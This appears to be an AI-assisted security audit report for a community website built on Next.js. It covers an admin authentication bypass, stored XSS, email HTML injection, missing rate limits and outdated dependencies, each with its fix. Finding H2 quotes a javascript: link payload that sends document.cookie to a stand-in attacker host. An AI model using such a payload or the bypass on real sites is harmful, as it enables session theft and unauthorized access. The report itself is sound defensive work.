# Security Audit Report — LCB Website

**Audit date:** 2026-06-16  
**Auditor:** Principal Application Security Engineer (AI-assisted)  
**Codebase:** Next.js 15→16 App Router, Upstash Redis KV, Cloudinary, Vercel/Cloudflare

---

## Security Score

| Phase | Score | Notes |
|-------|-------|-------|
| Before this audit | **38 / 100** | Active critical auth bypass, stored XSS vectors, RC React in prod, no rate limiting on public endpoints |
| After all fixes applied | **78 / 100** | All Critical/High/Medium issues resolved; remaining risks are Low or accepted |

---

## Findings

### CRITICAL — Fixed

#### C1: Admin Auth Bypass via Magazine Subdomain
**File:** `src/middleware.ts`  
**Impact:** Every `/api/admin/*` route (CRUD on all content, Cloudinary upload credentials, all LOR applications with PII) was publicly accessible with no authentication via `magazine.linkedincommunitybangladesh.com/api/admin/...`.

**Root cause:**
```typescript
// BEFORE — early return skipped the admin auth check entirely
if (host === MAGAZINE_HOST) {
  if (pathname.startsWith("/api/")) return NextResponse.next(); // ← bypassed auth
```

**Fix applied:** Narrowed passthrough to `/api/magazine/` only (the PDF proxy the iframe needs). All other `/api/admin/*` paths now fall through to the session-cookie auth check.

---

### HIGH — Fixed

#### H1: Stored XSS via `dangerouslySetInnerHTML` in `SafeHtml`
**Files:** `src/components/ui/RichTextEditor.tsx`, `src/app/forum/[id]/page.tsx`, `src/components/sections/Events.tsx`, `src/components/sections/News.tsx`  
**Impact:** HTML content written by admins (articles, events, news) was rendered raw into the DOM with no sanitization. A compromised admin account or supply-chain compromise of the editor could store `<script>` tags, `onerror` payloads, or `javascript:` links that execute for all public visitors.

**Fix applied:**
1. New `src/lib/sanitize.ts` — strips `<script>`, `<iframe>`, `<object>`, `on*` event attributes, `javascript:`/`vbscript:`/`data:` protocol URLs, and HTML comments before rendering.
2. `SafeHtml` now calls `sanitizeHtml()` before passing to `dangerouslySetInnerHTML`.
3. API routes (`/api/admin/articles`, `/api/admin/events`, `/api/admin/news`) now sanitize HTML content **at write time** — defense-in-depth.

#### H2: Stored XSS via `javascript:` Links in RichTextEditor
**File:** `src/components/ui/RichTextEditor.tsx:58`  
**Impact:** `insertLink()` called `prompt()` for a URL then passed it directly to `execCommand("createLink", url)` with no validation. An admin could insert `javascript:fetch('https://attacker.com/?c='+document.cookie)` links into article content. These survive to the public reader page where any visitor clicking the link executes JS.

**Fix applied:** URL is validated before `execCommand`; `javascript:`, `vbscript:`, and `data:` schemes are rejected with an alert.

#### H3: HTML Injection in LOR Notification Email
**File:** `src/app/api/lor/submit/route.ts`  
**Impact:** User-supplied answers (name, email, role, university) were interpolated raw into HTML email body. Attacker could inject tracking pixels, phishing links, or email-client-specific HTML payloads visible to the admin reviewing the email.

**Fix applied:** `escapeHtml()` applied to all user values before HTML interpolation. *(Fixed in prior session.)*

#### H4: LOR Submit — No Rate Limiting
**File:** `src/app/api/lor/submit/route.ts`  
**Impact:** Unlimited submissions could fill Upstash KV storage, exhaust Resend email quota, and DoS the LOR review process.

**Fix applied:** 3 submissions per IP per hour. *(Fixed in prior session.)*

#### H5: Outdated Dependencies with Known CVEs
**Package:** `next@^15.3.9`, `react@19.0.0-rc-*`  
**CVEs (high):** GHSA-g5qg-72qw-gw5v (Cache Key Confusion), GHSA-267c-6grr-h53f (Middleware bypass), and 15+ others in Next.js 9.3.4–16.3.0-canary.5 range. Using a Release Candidate of React in production is unsupported.

**Fix applied:** Upgraded to `next@^16.2.9` (latest stable with backported security patches) and `react@^19.2.7` (stable release).

---

### MEDIUM — Fixed

#### M1: IP Extraction Used Spoofable `x-forwarded-for`
**Files:** `src/app/api/admin/auth/route.ts`, `src/app/api/analytics/route.ts`  
**Impact:** Rate limiters used `x-forwarded-for` which is client-controlled if Cloudflare is in DNS-only mode, allowing brute-force bypass.

**Fix applied:** `getClientIp()` now prefers `CF-Connecting-IP` (Cloudflare-managed, not spoofable), extracted to shared `src/lib/rate-limit.ts`. All route files updated to use it.

#### M2: Visitor Counter — No Rate Limiting
**File:** `src/app/api/visitors/route.ts`  
**Impact:** Unlimited POSTs let anyone inflate pageview statistics.

**Fix applied:** 20 increments per IP per hour. *(Fixed in prior session.)*

#### M3: `SESSION_SECRET` Not Documented as Required
**File:** `.env.local`  
**Impact:** If `SESSION_SECRET` is unset (env var not configured on Vercel), the auth route returns HTTP 500 — admins cannot log in. If set to a predictable value, session tokens could be forged.

**Fix applied:** `SESSION_SECRET` is now documented in `.env.local` with generation instructions and a placeholder that will fail fast if not replaced.

#### M4: postcss DevDependency Below 8.5.10
**Package:** `postcss@^8.4.49` (GHSA-qx2v-qp2m-jg93)  
**Impact:** CSS stringify XSS — moderate, build-time only, not runtime-exploitable on deployed app.

**Fix applied:** Upgraded to `postcss@^8.5.15`.

---

### LOW — Accepted / Documented

#### L1: Session Tokens Are Not Revocable
**File:** `src/lib/token.ts`  
**Impact:** 7-day HMAC tokens. Changing `ADMIN_PASSWORD` does NOT invalidate live sessions; only rotating `SESSION_SECRET` does. No server-side token blacklist.  
**Accepted:** Single-admin site. Mitigation: rotate `SESSION_SECRET` if compromise suspected.

#### L2: No CAPTCHA on LOR Form
**File:** `src/app/lor/apply/LorApplyForm.tsx`  
**Impact:** Rate limiting (3/IP/hour) blocks simple floods but a distributed botnet could still spam submissions.  
**Recommended:** Add Cloudflare Turnstile or hCaptcha for stronger bot protection.

#### L3: Cloudinary Upload Signature Has No Domain Allowlist
**File:** `src/app/api/admin/upload-signature/route.ts`  
**Impact:** A valid admin session from any origin can generate Cloudinary upload signatures. Signatures expire (~1 hour), so the window is limited.  
**Recommended:** Validate `Origin`/`Referer` header matches your domain.

#### L4: MIME Type Validation Is Client-Controlled
**File:** `src/app/api/admin/upload/route.ts`  
**Impact:** File type checked via `Content-Type` (client-set). In production, Cloudinary is the final destination and re-validates content. In dev fallback, extension is from filename `.split(".").pop()` — safe because `safeName` is generated.  
**Accepted:** Production path through Cloudinary is safe.

#### L5: Bundled postcss Inside Next.js (GHSA-qx2v-qp2m-jg93)
**Impact:** Next.js 9.3.4–16.3.0-canary.5 depends on postcss `<8.5.10`. Our Next.js 16.2.9 bundles this version. The vulnerability is in CSS stringify output — a **build-time** issue, not a production runtime vulnerability.  
**Accepted:** Cannot fix without downgrading Next.js to 9.3.3 (catastrophic). Next.js team must ship a patch.

#### L6: `html2canvas` Is Unmaintained
**Package:** `html2canvas@1.4.1` (last release 2022)  
**Impact:** Used for card studio screenshot export. No recent security patches.  
**Recommended:** Replace with `dom-to-image-more` or `html-to-image` (actively maintained).

---

## Remaining Risks After Fixes

1. No CAPTCHA — distributed bots can submit LOR at 3/IP/hour across many IPs
2. No 2FA for admin login — single password is the only credential
3. `html2canvas` unmaintained — potential future CVEs with no upstream patches
4. Session non-revocation — password change doesn't log out active sessions
5. Cloudinary upload credentials scoped to folder but not domain-validated
6. Content saved before this audit (existing articles/events/news) was not sanitized retroactively — run a one-time KV migration to sanitize stored content

---

## Recommended Future Improvements

1. **Add Cloudflare Turnstile** to LOR form (`@marsidev/react-turnstile`, free tier)
2. **Migrate admin to 2FA** — TOTP (Authenticator app) stored in env
3. **Add TOTP token revocation** — store issued JTI in Redis with TTL for immediate session invalidation
4. **One-time content sanitization job** — read all articles/events/news from KV, run `sanitizeHtml()`, write back
5. **Replace `html2canvas`** with `html-to-image`
6. **Add Cloudflare WAF rules** to rate-limit `/api/lor/submit` and `/admin/login` at the CDN layer (free on Cloudflare)
7. **Add `Sec-Fetch-Site` / `Origin` validation** on admin write endpoints to mitigate CSRF from cross-origin requests
8. **Pin React and Next.js** to exact versions (`"next": "16.2.9"` not `"^16.2.9"`) to prevent supply-chain drift
